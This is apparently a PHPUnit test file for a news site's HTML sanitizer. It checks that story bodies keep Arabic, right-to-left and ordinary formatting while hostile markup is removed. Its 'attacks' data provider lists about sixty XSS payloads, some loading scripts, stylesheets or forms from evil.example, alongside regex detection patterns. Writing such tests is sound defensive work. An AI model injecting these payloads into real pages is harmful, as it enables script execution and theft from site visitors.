<?php

namespace Tests\Feature\Security;

use App\Support\HtmlSanitizer;
use DOMDocument;
use DOMElement;
use DOMNode;
use HTMLPurifier_DefinitionCacheFactory;
use Illuminate\Filesystem\Filesystem;
use PHPUnit\Framework\Attributes\DataProvider;
use Stevebauman\Purify\Facades\Purify;
use Tests\TestCase;

class HtmlSanitizerTest extends TestCase
{
    /** Mirrors config/purify.php: the only elements and attributes a story body may contain. */
    private const ALLOWED = [
        'p' => ['dir', 'lang'], 'br' => [], 'h2' => ['dir', 'lang'], 'h3' => ['dir', 'lang'], 'h4' => ['dir', 'lang'],
        'strong' => [], 'b' => [], 'em' => [], 'i' => [], 'u' => [], 's' => [],
        'ul' => [], 'ol' => [], 'li' => [], 'blockquote' => ['dir', 'lang'], 'hr' => [],
        'a' => ['href', 'title', 'rel', 'target'], 'img' => ['src', 'alt', 'width', 'height'],
        'figure' => [], 'figcaption' => [], 'span' => ['dir', 'lang'],
    ];

    private static string $cacheDir;

    public static function setUpBeforeClass(): void
    {
        parent::setUpBeforeClass();

        // Building the HTMLPurifier definition takes ~150 ms; a cache shared by the tests of this class
        // (and wiped at the start of each run, so a changed definition is never served stale) keeps it fast
        // and exercises the same unserialize path production takes from its second request on.
        self::$cacheDir = dirname(__DIR__, 3).'/storage/framework/testing/purify';
        (new Filesystem)->deleteDirectory(self::$cacheDir);
    }

    protected function setUp(): void
    {
        parent::setUp();

        // HTMLPurifier remembers its definition cache for the whole PHP process, which would pin it to
        // whichever test touched it first. A fresh factory lets this app's purify singleton register its own.
        HTMLPurifier_DefinitionCacheFactory::instance(new HTMLPurifier_DefinitionCacheFactory);

        config([
            'purify.configs.article.URI.Host' => 'sisi.news',
            'cache.stores.purify_test' => ['driver' => 'file', 'path' => self::$cacheDir],
            'purify.serializer.driver' => 'purify_test',
        ]);
    }

    /** @return array<string, array{string}> */
    public static function attacks(): array
    {
        $svg = base64_encode('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>');

        return [
            'script tag' => ['<p>a</p><script>alert(1)</script>'],
            'script with src' => ['<SCRIPT SRC=//evil.example/x.js></SCRIPT>'],
            'img onerror' => ['<img src=x onerror=alert(1)>'],
            'img onerror quoted, no space' => ['<img src="x"onerror="alert(1)">'],
            'img onload' => ['<img src="/a.jpg" onload="alert(1)" alt="a">'],
            'img lowsrc and dynsrc' => ['<img src="/a.jpg" lowsrc="javascript:alert(1)" dynsrc="javascript:alert(1)">'],
            'img srcset' => ['<img src="/a.jpg" srcset="javascript:alert(1) 1x">'],
            'a javascript' => ['<a href="javascript:alert(1)">x</a>'],
            'a javascript mixed case' => ['<a href="JaVaScRiPt:alert(1)">x</a>'],
            'a javascript entity' => ['<a href="java&#115;cript:alert(1)">x</a>'],
            'a javascript hex entity' => ['<a href="&#x6A;avascript:alert(1)">x</a>'],
            'a javascript leading space' => ['<a href=" javascript:alert(1)">x</a>'],
            'a javascript embedded tab' => ["<a href=\"java\tscript:alert(1)\">x</a>"],
            'a javascript embedded newline' => ["<a href=\"java\nscript:alert(1)\">x</a>"],
            'a vbscript' => ['<a href="vbscript:msgbox(1)">x</a>'],
            'a data html' => ['<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
            'a onclick' => ['<a href="/x" onclick="alert(1)">x</a>'],
            'a ftp' => ['<a href="ftp://example.com/x">x</a>'],
            'a file' => ['<a href="file:///etc/passwd">x</a>'],
            'img data svg' => ['<img src="data:image/svg+xml;base64,'.$svg.'">'],
            'img data png' => ['<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">'],
            'img javascript src' => ['<img src="javascript:alert(1)">'],
            'iframe' => ['<iframe src="https://evil.example"></iframe>'],
            'iframe srcdoc' => ['<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
            'svg onload' => ['<svg onload=alert(1)><circle r="5"/></svg>'],
            'svg script' => ['<svg><script>alert(1)</script></svg>'],
            'svg use' => ['<svg><use href="data:image/svg+xml;base64,AAAA#x"/></svg>'],
            'math xlink' => ['<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
            'style attribute expression' => ['<p style="width:expression(alert(1))">x</p>'],
            'style attribute url' => ['<p style="background:url(javascript:alert(1))">x</p>'],
            'style attribute position' => ['<span style="position:fixed;top:0;left:0;width:100%;height:100%">x</span>'],
            'style tag' => ['<style>@import "https://evil.example/x.css"; body{display:none}</style><p>x</p>'],
            'link tag' => ['<link rel="stylesheet" href="https://evil.example/x.css">'],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
            'base tag' => ['<base href="//evil.example/"><a href="x">x</a>'],
            'object' => ['<object data="x.swf" type="application/x-shockwave-flash"></object>'],
            'embed' => ['<embed src="x.swf">'],
            'form' => ['<form action="https://evil.example"><input name="password"><button>go</button></form>'],
            'input autofocus' => ['<input onfocus="alert(1)" autofocus>'],
            'event handler on div' => ['<div onclick="alert(1)" onmouseover="alert(2)">x</div>'],
            'event handler on p' => ['<p onmouseover="alert(1)">x</p>'],
            'body onload' => ['<body onload="alert(1)"><p>x</p></body>'],
            'split script tag' => ['<scr<script>ipt>alert(1)</scr</script>ipt>'],
            'double open bracket' => ['<<script>alert(1)//<</script>'],
            'extra quotes' => ['<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'],
            'nested tags' => ['<p><b><i><script>alert(1)</script></i></b></p>'],
            'conditional comment' => ['<!--[if IE]><script>alert(1)</script><![endif]-->'],
            'cdata' => ['<![CDATA[<script>alert(1)</script>]]>'],
            'comment smuggling' => ['<!-- --><script>alert(1)</script><!-- -->'],
            'null bytes' => ["<scr\0ipt>alert(1)</scr\0ipt>"],
            'entity encoded tags stay text' => ['&lt;script&gt;alert(1)&lt;/script&gt;'],
            'numeric entity tags stay text' => ['&#60;script&#62;alert(1)&#60;/script&#62;'],
            'unicode escapes' => ['<img src=x onerror="&#97;lert(1)">'],
            'target self' => ['<a href="https://example.com" target="_self">x</a>'],
            'target frame name' => ['<a href="https://example.com" target="top">x</a>'],
            'rel opener' => ['<a href="https://example.com" rel="opener">x</a>'],
            'id and class' => ['<p id="x" class="a" name="n" accesskey="x" tabindex="1" contenteditable="true">x</p>'],
            'data attributes' => ['<p data-x="1" aria-label="x" itemprop="x">x</p>'],
            'video with onerror' => ['<video src="x" onerror="alert(1)"><source src="x"></video>'],
            'details ontoggle' => ['<details open ontoggle="alert(1)"><summary>x</summary></details>'],
            'table' => ['<table><tr><td onclick="alert(1)">x</td></tr></table>'],
        ];
    }

    #[DataProvider('attacks')]
    public function test_attacks_are_neutralised(string $payload): void
    {
        $clean = HtmlSanitizer::clean($payload);

        $this->assertWithinAllowList($clean);
        $this->assertDoesNotMatchRegularExpression('/<\s*(script|iframe|svg|style|object|embed|form|input|link|meta|base|video|math)/i', $clean);
        $this->assertDoesNotMatchRegularExpression('/\son[a-z]+\s*=/i', $clean);
        $this->assertDoesNotMatchRegularExpression('/(javascript|vbscript|data)\s*:/i', html_entity_decode($clean));
        $this->assertStringNotContainsString('style=', $clean);
        $this->assertSame($clean, HtmlSanitizer::clean($clean), 'a second pass must not change the result');
    }

    public function test_escaped_markup_stays_inert_text(): void
    {
        $clean = HtmlSanitizer::clean('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>');

        $this->assertSame('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>', $clean);
        $this->assertStringNotContainsString('<script', $clean);
    }

    public function test_script_and_style_contents_are_dropped_with_their_tags(): void
    {
        $clean = HtmlSanitizer::clean('<p>keep</p><script>stealCookies()</script><style>body{display:none}</style>');

        $this->assertSame('<p>keep</p>', $clean);
    }

    public function test_javascript_links_lose_their_href_but_keep_their_text(): void
    {
        $this->assertSame('<a>click</a>', HtmlSanitizer::clean('<a href="javascript:alert(1)">click</a>'));
    }

    public function test_data_urls_are_stripped_from_links_and_images(): void
    {
        $this->assertStringNotContainsString('data:', HtmlSanitizer::clean('<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">'));
        $this->assertStringNotContainsString('data:', HtmlSanitizer::clean('<a href="data:text/plain,hi">x</a>'));
    }

    /** @return array<string, array{string}> */
    public static function benign(): array
    {
        return [
            'paragraphs' => ['<p>First paragraph.</p><p>Second paragraph.</p>'],
            'headings' => ['<h2>Two</h2><h3>Three</h3><h4>Four</h4>'],
            'inline formatting' => ['<p><strong>bold</strong> <b>b</b> <em>em</em> <i>i</i> <u>u</u> <s>s</s></p>'],
            'line break and rule' => ['<p>one<br>two</p><hr>'],
            'lists' => ['<ul><li>a</li><li>b</li></ul><ol><li>1</li><li>2</li></ol>'],
            'blockquote' => ['<blockquote><p>quoted</p></blockquote>'],
            'internal link' => ['<p><a href="/ar/news/12-title" title="t">read</a></p>'],
            'mailto and tel' => ['<p><a href="mailto:desk@example.com">mail</a> <a href="tel:+20225750000">call</a></p>'],
            'image' => ['<img src="/storage/articles/a.jpg" alt="A photo" width="600" height="400">'],
            'figure' => ['<figure><img src="/storage/articles/a.jpg" alt="A photo"><figcaption>Caption</figcaption></figure>'],
            'arabic' => ['<p>أعلنت وزارة المالية اليوم عن حزمة إجراءات جديدة لدعم الصادرات المصرية.</p>'],
            'arabic with diacritics and digits' => ['<p>القاهرة، ٢٠٢٦ — «نص مقتبس» وعلامة التشكيل: مَرْحَبًا</p>'],
            'rtl and lang attributes' => ['<p dir="rtl" lang="ar">نص عربي مع <span dir="ltr" lang="en">English words</span> داخله</p>'],
            'direction on blocks' => ['<h2 dir="rtl" lang="ar">عنوان</h2><blockquote dir="ltr" lang="en"><p>An English quote</p></blockquote>'],
            'emoji' => ['<p>Good news 🎉 أخبار سارة 🇪🇬</p>'],
        ];
    }

    #[DataProvider('benign')]
    public function test_legitimate_formatting_survives_untouched(string $html): void
    {
        $this->assertSame($html, HtmlSanitizer::clean($html));
    }

    public function test_arabic_is_not_turned_into_entities(): void
    {
        $clean = HtmlSanitizer::clean('<p>مرحبًا بكم في سيسي نيوز &amp; أخبار اليوم&nbsp;الآن</p>');

        $this->assertStringContainsString('مرحبًا بكم في سيسي نيوز', $clean);
        $this->assertStringContainsString('أخبار اليوم', $clean);
        $this->assertDoesNotMatchRegularExpression('/&#\d+;|&#x[0-9a-f]+;/i', $clean);
        $this->assertStringContainsString('&amp;', $clean);
    }

    public function test_external_links_are_forced_to_noopener_noreferrer_nofollow(): void
    {
        $this->assertSame(
            '<a href="https://example.com/x" rel="noopener noreferrer nofollow">x</a>',
            HtmlSanitizer::clean('<a href="https://example.com/x">x</a>'),
        );
        $this->assertSame(
            '<a href="http://example.com" target="_blank" rel="noopener noreferrer nofollow">x</a>',
            HtmlSanitizer::clean('<a href="http://example.com" target="_blank" rel="author">x</a>'),
        );
    }

    public function test_the_editors_own_rel_cannot_weaken_the_hardening(): void
    {
        $clean = HtmlSanitizer::clean('<a href="https://example.com" rel="opener external">x</a>');

        $this->assertStringContainsString('rel="noopener noreferrer nofollow"', $clean);
        $this->assertStringNotContainsString('opener external', $clean);
    }

    public function test_links_to_this_site_are_not_marked_nofollow(): void
    {
        $clean = HtmlSanitizer::clean('<a href="https://sisi.news/ar/news/5-x">same</a><a href="/en">relative</a>');

        $this->assertStringNotContainsString('nofollow', $clean);
    }

    public function test_a_new_window_always_gets_noopener(): void
    {
        $clean = HtmlSanitizer::clean('<a href="/ar" target="_blank">x</a>');

        $this->assertStringContainsString('target="_blank"', $clean);
        $this->assertMatchesRegularExpression('/rel="[^"]*noopener[^"]*"/', $clean);
    }

    public function test_only_the_blank_target_is_allowed(): void
    {
        $this->assertStringNotContainsString('target=', HtmlSanitizer::clean('<a href="/ar" target="_parent">x</a>'));
    }

    public function test_an_image_without_alt_gets_an_empty_alt_not_its_file_name(): void
    {
        $this->assertSame('<img src="/storage/a.jpg" alt="">', HtmlSanitizer::clean('<img src="/storage/a.jpg">'));
    }

    public function test_elements_outside_the_allow_list_are_unwrapped_to_their_text(): void
    {
        $clean = HtmlSanitizer::clean('<div><h1>Headline</h1><font color="red">red</font><center>mid</center></div>');

        $this->assertSame('Headlinered'.'mid', $clean);
    }

    public function test_a_definition_loaded_from_the_cache_behaves_the_same(): void
    {
        $html = '<p>x <a href="https://example.com/a">a</a> <script>1</script></p>';
        $fresh = HtmlSanitizer::clean($html);
        $this->assertNotEmpty(glob(self::$cacheDir.'/*'), 'the compiled definition should have been cached');

        // A new container instance forgets the compiled definition, so this one is read back from the cache.
        Purify::clearResolvedInstance('purify');
        $this->app->forgetInstance('purify');

        $this->assertSame($fresh, HtmlSanitizer::clean($html));
        $this->assertStringContainsString('rel="noopener noreferrer nofollow"', $fresh);
    }

    public function test_empty_and_blank_input_yield_an_empty_string(): void
    {
        $this->assertSame('', HtmlSanitizer::clean(null));
        $this->assertSame('', HtmlSanitizer::clean(''));
        $this->assertSame('', HtmlSanitizer::clean("  \n\t "));
    }

    public function test_invalid_utf8_is_repaired_not_fatal(): void
    {
        $clean = HtmlSanitizer::clean("<p>ok \xC3\x28 bad \xFF bytes</p>");

        $this->assertTrue(mb_check_encoding($clean, 'UTF-8'));
        $this->assertStringStartsWith('<p>ok', $clean);
    }

    public function test_a_long_arabic_article_is_sanitised_in_bounded_memory(): void
    {
        $paragraph = '<p dir="rtl" lang="ar">'.str_repeat('نص تجريبي طويل للخبر. ', 40).'<a href="https://example.com">رابط</a></p>';
        $body = str_repeat($paragraph, 400);
        $before = memory_get_usage();

        $clean = HtmlSanitizer::clean($body);

        $this->assertStringContainsString('رابط', $clean);
        $this->assertLessThan(40 * 1048576, memory_get_usage() - $before);
    }

    public function test_cleaning_is_idempotent_for_benign_and_hostile_documents(): void
    {
        foreach ([...array_column(self::benign(), 0), ...array_column(self::attacks(), 0)] as $html) {
            $once = HtmlSanitizer::clean($html);
            $this->assertSame($once, HtmlSanitizer::clean($once), "not idempotent for: {$html}");
        }
    }

    /** Structural check: parse the output and verify every element, attribute and URL is permitted. */
    private function assertWithinAllowList(string $html): void
    {
        if ($html === '') {
            $this->addToAssertionCount(1);

            return;
        }

        $document = new DOMDocument;
        $document->loadHTML('<?xml encoding="utf-8"?><body>'.$html.'</body>', LIBXML_NOERROR | LIBXML_NOWARNING);

        $this->walk($document->getElementsByTagName('body')->item(0));
    }

    private function walk(DOMNode $node): void
    {
        foreach ($node->childNodes as $child) {
            if ($child instanceof DOMElement) {
                $name = strtolower($child->tagName);
                $this->assertArrayHasKey($name, self::ALLOWED, "element <{$name}> is not allowed");

                foreach ($child->attributes as $attribute) {
                    $this->assertContains($attribute->name, self::ALLOWED[$name], "attribute {$attribute->name} is not allowed on <{$name}>");
                    if (in_array($attribute->name, ['href', 'src'], true)) {
                        $this->assertDoesNotMatchRegularExpression('/^\s*(javascript|vbscript|data|file|ftp):/i', $attribute->value);
                    }
                }
                $this->walk($child);
            } elseif ($child->nodeType === XML_COMMENT_NODE || $child->nodeType === XML_CDATA_SECTION_NODE) {
                $this->fail('comments and CDATA must not survive');
            }
        }
    }
}
